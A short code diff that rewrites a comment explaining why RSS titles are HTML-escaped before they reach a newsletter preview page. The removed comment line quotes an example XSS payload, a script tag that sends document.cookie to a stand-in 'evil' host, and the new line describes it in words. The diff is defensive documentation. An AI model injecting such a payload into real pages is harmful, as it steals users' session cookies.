@@ -1292,8 +1292,8 @@
       //   3. Strip "Google News " prefix from feed names
 
       // HTML-escape helpers (mirror src/shared/html-escape.ts). Used by the
-      // 3 newsletter preview builders below. Without these, an RSS title like
-      //   <script>fetch('https://evil/?t='+document.cookie)</script>
+      // 3 newsletter preview builders below. Without these, an RSS title with an
+      // injected script tag (angle-bracket-script ... angle-bracket-slash-script)
       // would render verbatim into the SPA preview DOM and execute. The SPA
       // is plain JS in a browser → XSS is real here (not just theoretical
       // like in the email path where clients sanitize).
